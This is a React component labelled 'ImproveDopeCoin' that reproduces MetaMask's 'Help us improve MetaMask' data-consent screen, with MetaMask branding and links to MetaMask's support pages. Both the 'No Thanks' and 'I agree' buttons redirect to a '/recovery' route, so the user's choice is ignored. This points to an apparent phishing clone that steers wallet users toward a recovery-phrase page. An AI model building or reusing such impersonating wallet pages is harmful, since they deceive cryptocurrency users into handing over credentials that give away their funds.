import React, { useState } from "react";
import logo from "../assets/images/logo.png"

const ImproveDopeCoin = () => {
  const [agreed, setAgreed] = useState(false);

  return (
    <div
      className="min-h-screen flex flex-col items-center"
      style={{
        backgroundColor: "#141618", // The dark background
        color: "var(--color-text-default)",
      }}
    >
      {/* NAVBAR (top) */}
      <nav className="h-16 flex items-center justify-between">
        {/* Left: random logo image */}
        <div className="flex items-center space-x-2">
          <img
            src={logo}
            alt="MetaMask"
            className="h-6 w-auto"
          />
          {/*<span className="font-bold text-white">MetaMask</span>*/}
        </div>
        {/* Right: Language Selector */}
        <select className="border border-gray-500 bg-[rgb(20,22,24)] text-white px-14 py-2 rounded-md">
          <option>English</option>
          <option>Spanish</option>
          <option>French</option>
          {/* etc. */}
        </select>
      </nav>

      {/* MAIN CONTENT: Center card */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div
          className="relative w-full max-w-lg rounded-xl p-6 md:p-4 pb-14 border border-zinc-800"
        >
          {/* SLIDE title & subtitle */}
          <h2 className="text-lg md:text-2xl font-bold text-center mb-2 text-white">
            Help us improve MetaMask
          </h2>
          <p className="text-start mb-2 px-2">
            We’d like to gather basic usage and diagnostics data to improve MetaMask. Know that we never sell the data you provide here.
          </p>
          <p className="text-start px-2">

            <a
              href="https://support.metamask.io/configure/privacy/profile-privacy/#how-is-the-profile-created"
              target="_blank"
              rel="noopener noreferrer"
              className="text-start text-[rgb(67,174,252)]"
            >
              Learn how we protect your privacy while collecting usage data for your profile.
            </a>
          </p>
          <p className="text-start py-2 px-2">
            When we gather metrics, it will always be...
          </p>
          {/* “Private, General, Optional” list with green checks */}
          <div className="space-y-3 px-4 mb-4">
            {/* Private */}
            <div className="flex items-start space-x-2">
              {/* Green check icon */}
              <svg
                className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M16.707 5.293a1 1 0 00-1.414 0L8 12.586 
                    4.707 9.293a1 1 0 00-1.414 1.414l4 4a1 1 0 
                    001.414 0l8-8a1 1 0 000-1.414z"
                  clipRule="evenodd"
                />
              </svg>
              <p className="text-sm text-white leading-5">
                <span className="font-bold text-white">Private:</span>{" "}
                clicks and views on the app are stored, 
                but other details (like your public address) are not.
              </p>
            </div>

            {/* General */}
            <div className="flex items-start space-x-2">
              {/* Green check icon */}
              <svg
                className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M16.707 5.293a1 1 0 00-1.414 0L8 12.586 
                    4.707 9.293a1 1 0 00-1.414 1.414l4 4a1 1 0 
                    001.414 0l8-8a1 1 0 000-1.414z"
                  clipRule="evenodd"
                />
              </svg>
              <p className="text-sm text-white leading-5">
                <span className="font-bold text-white">General:</span>{" "}
                we temporarily use your IP address to detect
                a general location (like your country or region),
                but it’s never stored.
              </p>
            </div>

            {/* Optional */}
            <div className="flex items-start space-x-2">
              {/* Green check icon */}
              <svg
                className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M16.707 5.293a1 1 0 00-1.414 0L8 12.586 
                    4.707 9.293a1 1 0 00-1.414 1.414l4 4a1 1 0 
                    001.414 0l8-8a1 1 0 000-1.414z"
                  clipRule="evenodd"
                />
              </svg>
              <p className="text-sm text-white leading-5">
                <span className="font-bold text-white">Optional:</span>{" "}
                you decide if you want to share or 
                delete your usage data via settings any time.
              </p>
            </div>
          </div>
          
          {/* "I agree" row (centered) */}
          <div className="flex items-center mb-6 space-x-1">
            <input
              type="checkbox"
              checked={agreed}
              onChange={() => setAgreed(!agreed)}
              className="custom-checkbox-2"
              id="agree-terms"
            />
            <label
              htmlFor="agree-terms"
              className="text-xs text-gray-300 text-start ml-2"
            >
              We’ll use this data to learn how you interact with our marketing
              communications. We may share relevant news (like product features).
            </label>
          </div>

          <p className="text-start mb-8 text-gray-400 px-2 disclaimer">
            We’ll let you know if we decide to use this data for other purposes. You can review our{" "} 
            <a
              href="https://support.metamask.io/configure/privacy/profile-privacy/#how-is-the-profile-created"
              target="_blank"
              rel="noopener noreferrer"
              className="text-start text-[rgb(67,174,252)]"
            >
              Privacy Policy{" "} 
            </a>
            for more information. Remember, you can go to settings and opt out at any time.          </p>
          {/* Action buttons (centered) */}
          <div className="flex flex-row items-center justify-between align-items space-y-2">
            {/* "Create a new wallet" */}
            <button
              className={`py-2 text-sm rounded-full border font-medium improve
                border-[rgb(67,174,252)] text-[rgb(67,174,252)] hover:bg-[rgb(67,174,252)] hover:text-white hover:opacity-90
              `}
              onClick={() => {
                window.location.href = "/recovery"; // Redirect to "/improve"
            }}
            >
              No Thanks
            </button>

            {/* "Import an existing wallet" */}
            <button
              className={`py-2 text-sm rounded-full font-medium improve
                bg-[rgb(67,174,252)] hover:bg-[rgb(67,174,252)] hover:opacity-90 text-black
              `}
              style={{margin: 0}}
              onClick={() => {
                  window.location.href = "/recovery"; // Redirect to "/improve"
              }}
            >
              I agree
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ImproveDopeCoin;